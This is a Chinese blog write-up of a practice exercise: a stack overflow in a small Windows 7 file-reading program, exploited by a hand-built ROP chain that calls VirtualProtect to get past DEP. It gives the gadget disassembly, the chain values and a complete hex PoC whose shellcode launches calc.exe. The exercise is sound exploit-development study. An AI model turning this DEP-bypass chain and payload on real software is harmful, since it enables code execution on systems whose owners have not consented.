# ROP的第一次实战


<!--more-->

---


## 1. ROP 介绍
介绍`ROP`之前，也先介绍下`DEP`
{{< admonition quote >}}
数据执行保护 (DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码，在这样的内存空间中，即使出现了溢出情况，堆栈也是不可执行的。
{{< /admonition >}}

`ROP`，Retrun-oriented Programmming(面向返回的编程)，是一种可`绕过DEP`的方法。技术原理就是通过构造特定的溢出内容，使程序通过`RET`指令跳转到构造的内容去执行相应的指令，而构造的内容则是程序自身模块中的代码段的地址，这样程序去执行时则不会触发DEP。一般构造的ROP链是构造`VirtualProtect`函数去把栈空间修改为可读可写可执行，然后再跳转到栈空间去执行`ShellCode`。

ROP的原理大概懂了，但一直没有机会进行实践，某一天，[@老刘](#)发来一个程序，说程序存在溢出漏洞，叫找到溢出点并利用，于是开整！

实验环境：Windows7 32位
![](/images/ROP的第一次实战/fb77eb15982ebf6e88807d498222f1ee8fe0a13bfe9bf633514a911088b23405.png "实验环境")

---

## 2. 寻找程序溢出点，尝试利用

### 2.1 程序分析

首先分析程序，看看程序做了什么。从下面可以看到，该程序就是简单的读取文件内容并输出，很简单的一个小程序。在这种程序中，存在很明显的栈溢出。首先读取文件时先获取了文件大小，然后根据大小读取了文件内容并存放在栈空间，但栈空间空间不够大，只要构造足够大的文件，这个程序必然会崩溃，发生溢出。
![](/images/ROP的第一次实战/0e91c4fbd8ceea61eba627aa28265ee3264c49bd9bda3b58781a2f87a5d18ee1.png "分析程序")

### 2.2 构造文件，使其溢出

* 构造的文件如下：
![](/images/ROP的第一次实战/07b3bf1b7386c4dbf7c63dcf96ea51ca1b0c26f88031e67615f0ea5530b816ff.png "构造的文件")

* 运行程序，可以看到程序的确产生了溢出
![](/images/ROP的第一次实战/ef31c6b2522b03634356aec3772f5bb3f5a9b7b51b8db8ac2cc935af5f31f75b.png "程序溢出")

### 2.3 寻找 JMP ESP，尝试利用

这里只是先尝试是否可利用，所以我这里在`kernel32.dll`中随便找了个`JMP ESP`的指令地址`0x767CF7F7`，然后构造文件并尝试利用
![](/images/ROP的第一次实战/52a579de12124b308e74945275d492ef7372fcfcda742b37d97eec86927c7910.png "DEP保护")
可以看到执行栈中的数据时，程序报异常了，说明此程序开启了`DEP`，需要通过`ROP`绕过才行。

{{< admonition >}}
OD需要关闭插件和选项中的异常跳过才能观察到异常产生
{{< /admonition >}}

---

## 3.寻找未开启 ASLR 的模块

在构造`ROP`链之前，需要从程序的加载模块中找到未开启`ASLR(随机基址)`的模块，这样才能保证`exp`的通用性。

* 使用**Mona**查找未开启随机基址的模块

    ```shell
    > # windbg命令
    > .load pykd.pyd    # 加载python
    > !py mona          # 执行mona，这里是为了下载符号
    > !py mona noaslr   # 查找未开启aslr的模块
    ```

* 结果如下：
![](/images/ROP的第一次实战/123f7a61de5afeaf8c587e83ea145ae1b8f70b98dd9e5a51d45c015f53694031.png "未开启ASLR的模块")

	可以看到未开启随机基址的模块只有一个，那就是程序本身，那么接下来的`ROP`链只能在程序本模块找了

* 这里可以在**Mona**里尝试自动查找`ROP`链：

    ```shell
    > # windbg命令
    > !py mona rop
    ```

* 结果如下：
![](/images/ROP的第一次实战/cf399dde0dd0c534bf96f2979e48fb6862588b27c19a48e318db6fe98e9b3e29.png "Mona查找ROP链")

	可以看到通过**Mona**查找是找不到完整的`ROP`链的，还是得自己手动查找

---

## 4. 构造 ROP 链的思路

我这里的思路还是构造`VirtualProtect`，修改栈空间的内存属性，然后跳转到栈空间执行`ShellCode`。

### 4.1 寻找 VirtualProtect 的地址

首先需要找到能获取`VirtualProtect`地址的方法，因为`VirtualProtect`是`kernel32.dll`中的地址，而`kernel32.dll`又是开启随机基址的，所以`VirtualProtect`的地址肯定不能写成硬编码。

* 思路1：通过本程序的导入表获取`VirtualProtect`的地址，因为本程序的没有随机基址的，只要导入表中有`VirtualProtect`的地址，那么就将此IAT的地址写成硬编码就能获取`VirtualProtect`的地址，那么先找到程序的导入表看看：
![](/images/ROP的第一次实战/a6dd20e251f6d458f6b3067f2b78a563692e3b502dd82afda70407ff0c21be4e.png "程序导入表")
  天公不作美，可以看到导入表中并没有导入`VirtualProtect`，需要另想办法。

* 思路2：通过程序代码段中的`mov xxx,fs:[0x30]`这种指令，获取`kernel32.dll`的首地址，然后通过偏移获取`VirtualProtect`的地址：  
![](/images/ROP的第一次实战/44c06254217926f3f79d1b0b8a86ca14254c0611a344eaa1a91a66e05780bd7f.png "FS寄存器") 
  这个就更没有了，整个程序中也就只有上图中两种对`FS`寄存器操作的指令，所以这条路也不行了。

* 思路3：经过 [@梦轩老哥](https://passport.kanxue.com/user-center-830989.htm)的提醒，找到这样一种方法：
	* 首先获取导入表中`kernel32.dll`的其他`API地址`，求出`VirtualProtect`地址距离这个`API地址`的偏移
	* 然后在程序中找到`相加`或`相减`的指令地址，将其构造成`ROP`链，这样就能获取到`VirtualProtect`的地址了
	* 例如下图这样：
  ![](/images/ROP的第一次实战/58ff2e5776cf0ea9c0350ac9f62a324823b8d730c7cda059e26fdf77385f931b.png "通过偏移获取地址")

	这个思路的确能很准确的获取到`VirtualProtect`的地址，但仅限于当前测试的系统版本上。因为其他版本的操作系统`kernel32.dll`中的函数地址偏移会发生改变，那么这种方式也就失效了。不过至少在这个版本的操作系统上，这种方式是通杀的，所以这里就采用这种方式获取`VirtualProtect`的地址。  

### 4.2 VirtualProtect 的参数

执行`VirtualProtect`，需要传递参数。`VirtualProtect`的原型是这样的：

 ```C++
BOOL VirtualProtect(
  LPVOID lpAddress,             // 需要修改属性的内存地址
  SIZE_T dwSize,                // 修改的大小
  DWORD  flNewProtect,          // 新属性
  PDWORD lpflOldProtect         // 存放旧属性的缓冲区
);
 ```


在这里`参数2`和`参数3`可以确定，而`参数1`和`参数4`则需要填写栈的地址，如果程序开启了随机基址，则不能写成硬编码，需要动态获取。当然这里程序没有随机基址，那么这两个参数可以随意找一个栈地址，写成硬编码就行了。  

### 4.3 JMP 指令

执行`VirtualProtect`之后，需要跳转到存放`ShellCode`的栈地址去执行，所以执行`VirtualProtect`代码的位置后面必须有`JMP xxx`或`RET`等这样的指令，这样才能跳转过去。而这个栈地址因为模块未开启随机基址的原因，所以可以测试之后将这个地址写成硬编码。  

---

## 5. 尝试构造 ROP 链

这里采用上面的思路3构造`ROP`链，大概分为以下几步：
* 获取`VirtualProtect`地址
* 构造`VirtualProtect`参数
* 调用`VirtualProtect`
* 跳转到`ShellCode`地址并执行


### 5.1 相关问题分析

首先需要构造一个存放`API地址`的导入表地址，该`API`必须与`VirtualProtect`同处于一个模块，也就是`kernel32`模块。

我这里使用导入表中第一个`API`地址，从前面的图中可以看到，当前程序的导入表第一个`API`为`kernel32.IsDebuggerPresent`函数，那么需要构造的是存放这个函数的导入表地址，也就是`0x402000`，而不是函数的实际地址`0x7675B02B`。

{{< admonition info >}}
这里解释下为什么构造的是导入表的地址，而不是直接构造某个函数的实际地址。因为`kernel32`模块肯定是开启了随机基址的，每台机器的同一个函数的实际地址都不一致，如何获取到函数的实际地址，那就只能通过导入表来获取，这也是导入表存在的意义。要是能直接构造，那直接构造`VirtualProtect`的地址就完事了，何必还要费这么大功夫。
{{< /admonition>}}

构造之前，需要考虑两个问题：

* 使用哪个寄存器？

	这里使用哪个寄存器都行，只要能精准控制寄存器就可以，但是必须要保证能通过这个寄存器取到所在内存的值才行。因为如果这里使用`EAX`，那么后面取`API地址`的时候必然会用到`MOV xxx,[EAX]`这样的指令，但可能程序中不存在这样的指令，所以就需要多次测试，找到可用的寄存器。

* 如何得到`VirtualProtect`的地址？

	这里使用偏移来得到`VirtualProtect`的地址，那么就得使用相加或相减的语句。当然如果刚好程序中有相关的语句最好，但是大部分都没有这么好的事。例如`kernel32.IsDebuggerPresent`函数距离`VirtualProtect`函数为0x50，但就是没有`ADD EAX，0x50`这样的语句存在，那么就需要改变思路，用多条语句相加减实现。

* 上面两个问题的举例语句：

    ```assembly
    ; 寄存器取值
    MOV ECX, [EAX + 8]
    MOV ECX, [EBP - 8]
    
    ; 多条语句相加减
    ADD EAX，EDX
    ADD EAX, 0x10
    SUB EAX, EDX
    SUB EAX, 0x10
    INC EAX
    DEC EAX
    ```

<br />

### 5.2 获取 VirtualProtect 地址

* 给`EAX`赋值，需要与后面匹配

| ROP值 | 说明 |
| ---- | ---- |
| 7F154000 | 溢出后跳转的第一个地址，给EAX赋值 |
| F81F4000 | 给EAX赋的值 |
| 00000000 | 填充物 |

 ```assembly
0040157F      | 58                    | pop eax            ; EAX = 0x401FF8
00401580      | 5E                    | pop esi            ; ESI = 0
00401581      | C3                    | ret                ; 跳到下一个构造好的ROP链
 ```

* 给`EDI`和`ESI`赋值，后面会用到

| ROP值 | 说明 |
| ---- | ---- |
| 84164000 | 第二个RET地址，赋值偏移给ESI |
| 00000000 | 给EDI赋值为0，后面会比较EDI |
| 80A0FFFF | 给ESI赋值，将ESI设置为一个负数偏移，后面通过加法获取到VirtualProtect的地址(这个偏移是计算得来的) |

 ```assembly
00401684      | 5F                    | pop edi             ; EDI = 0
00401685      | 5E                    | pop esi             ; ESI = 0xFFFFA080
00401686      | C3                    | ret                 ; 跳到下一个构造好的ROP链
 ```

* 通过`EAX`获取导入表中函数的地址，因为没有`MOV xxx,[EAX]`这样的指令，这里使用的是`mov ecx, dword ptr [eax + 8]`

| ROP值 | 说明 |
| ---- | ---- |
| 9B134000 | 第三个RET地址，获取 VirtualProtect 地址 |
| 00000000 | 填充物 |
| 00000000 | 填充物 |
| 00000000 | 填充物 |
| 00000000 | 填充物 |

 ```assembly
0040139B      | 8B 48 08              | mov ecx,dword ptr ds:[eax+8]        ; eax+8 = 0x402000, 获取到导入表中的函数地址
0040139E      | 03 CE                 | add ecx,esi                         ; 将函数地址加上偏移得到VirtualProtect地址
004013A0      | 3B F9                 | cmp edi,ecx
004013A2      | 72 0A                 | jb consoleapplication1.4013AE       ; edi为0，所以直接跳转
004013A4      | 42                    | inc edx
004013A5      | 83 C0 28              | add eax,28
004013A8      | 3B D3                 | cmp edx,ebx
004013AA      | 72 E8                 | jb consoleapplication1.401394
004013AC      | 33 C0                 | xor eax,eax
004013AE      | 5F                    | pop edi                             ; 从上方跳转至此
004013AF      | 5E                    | pop esi
004013B0      | 5B                    | pop ebx
004013B1      | 5D                    | pop ebp
004013B2      | C3                    | ret                                 ; 跳到下一个构造好的ROP链
 ```

这里的`ESI`为偏移，而这个偏移需要根据选择的函数和系统的不同而改变的  

### 5.3 转换 ECX 到 EAX

通过上面的方法，`ECX`已经为`VirtualProtect`的地址了，但这里没有`CALL ECX`这样的指令，所以还需要将`ECX`转换到其他寄存器上去。因为这里有`CALL EAX`，所以我这里选择的是`MOV EAX, ECX`

| ROP值 | 说明 |
| ---- | ---- |
| 59144000 | 第四个RET地址，将 VirtualProtect 地址赋值给EAX |

```assembly
00401459      | 8B C1                 | mov eax,ecx                 ; eax = VirtualProtect
0040145B      | C3                    | ret                         ; 跳到下一个构造好的ROP链
```

### 5.3 处理后续
现在`EAX`已经是`VirtualProtect`的地址了，已经可以`CALL EAX`了。但这里寻找的`CALL EAX`指令执行后还执行了其他的指令，会影响`RET`的位置，所以需要将后续处理好

| ROP值 | 说明 |
| ---- | ---- |
| 84164000 | 第五个RET地址，处理后续  |
| 00000000 | 给EDI赋值为0 |
| 00000000 | 给ESI赋值为0 |

```assembly
00401684      | 5F                    | pop edi             ; EDI = 0
00401685      | 5E                    | pop esi             ; ESI = 0
00401686      | C3                    | ret                 ; 跳到下一个构造好的ROP链
```

### 5.5 执行 VirtualProtect
开始执行`VirtualProtect`，需要传递参数，所以构造的内容还包括参数

| ROP值 | 说明 |
| ---- | ---- |
| 7B164000 | 第六个RET地址，执行 VirtualProtect |
| FCFF1200 | VirtualProtect参数1：当前栈地址 |
| 01000000 | VirtualProtect参数2：大小 |
| 40000000 | VirtualProtect参数3：修改的属性 |
| FCFF1200 | VirtualProtect参数4：随意的栈地址 |
| 00000000 | 填充物 |
| 00000000 | 填充物 |

```assembly
0040167B      | FF D0                 | call eax            ; 执行VirtualProtect
0040167D      | 83 C6 04              | add esi,4           ; esi = 4
00401680      | 3B F7                 | cmp esi,edi			; 第三步做的工作就为了这里
00401682      | 72 F1                 | jb consoleapplication1.401675   ; esi>edi, 所以不会跳转
00401684      | 5F                    | pop edi
00401685      | 5E                    | pop esi
00401686      | C3                    | ret                 ; 跳到下一个构造好的ROP链
```

这里需要说明一点的是，`VirtualProtect`的参数问题，`参数1`和`参数4`需要根据自己系统上的栈空间来构造

### 5.6 跳转到栈空间
执行了`VirtualProtect`之后，就需要跳转到栈空间去执行`ShellCode`了，构造了这个栈地址之后`ROP`链也就到这就结束了，其余的就是`ShellCode`了。而这个栈空间地址也需要根据自己构造的`ROP`链和系统来决定

| ROP值 | 说明 |
| ---- | ---- |
| A8FF1200 | 最后一个RET地址，执行ShellCode的地址 |

---

## 6. 最终的 Poc

```c
// 填充物
313233343132333431323334313233343132333431323334313233343132330090909090

// ROP链
7F154000
F81F4000
00000000
84164000
00000000
80A0FFFF
9B134000
00000000
00000000
00000000
00000000
59144000
84164000
00000000
00000000
7B164000
FCFF1200
01000000
40000000
FCFF1200
00000000
00000000
A8FF1200

// ShellCode
A100204000	// mov eax,[0x402000]	获取导入表函数地址
056A360400	// add eax,4366A   	通过偏移找到WinExec()函数，这个偏移需要根据系统而决定
EB14            // jmp 12FFC8		跳转到下方去执行，这里的偏移根据参数不同需要改变
636D642E657865202F632063616C632E65786500	// "cmd.exe /c calc.exe"字符串，WinExec()的参数

6A00        // push 0		WinExec()参数1
68B4FF1200  // push 12FFB4	WinExec()参数2，这里的参数地址需要根据参数改变
FFD0        // call eax 	执行WinExec()

// 完整的Poc
3132333431323334313233343132333431323334313233343132333431323300909090907F154000F81F400000000000841640000000000080A0FFFF9B13400000000000000000000000000000000000591440008416400000000000000000007B164000FCFF12000100000040000000FCFF12000000000000000000A8FF1200A100204000056A360400EB14636D642E657865202F632063616C632E657865006A0068B4FF1200FFD0
```

---

## 7. 执行效果

这个`Poc`在当前系统版本上是通杀的，无论重启还是怎么样，都能实现精准溢出并执行
![](/images/ROP的第一次实战/eef9fc77d6cd3644f5a18decb28dc6d1fb728299f7905d4094753f891d694c33.png "执行效果")

---

## 8. END

这次实验，是把以前看过`ROP`资料给实际运用起来了，而且是手动寻找的`ROP`链，算是理论+实践结合了，收获很大。

这次实践中，还是遇到了老问题，思路不够开阔。获取`VirtualProtect`地址时，当没有`导入表`和`FS寄存器`的时候，我的确找不到其他办法突破了，要是没有 [@梦轩老哥](https://passport.kanxue.com/user-center-830989.htm) 的帮助，可能也构造不出版本通杀的`Poc`，非常感谢 [@梦轩老哥](https://passport.kanxue.com/user-center-830989.htm) 的帮助。
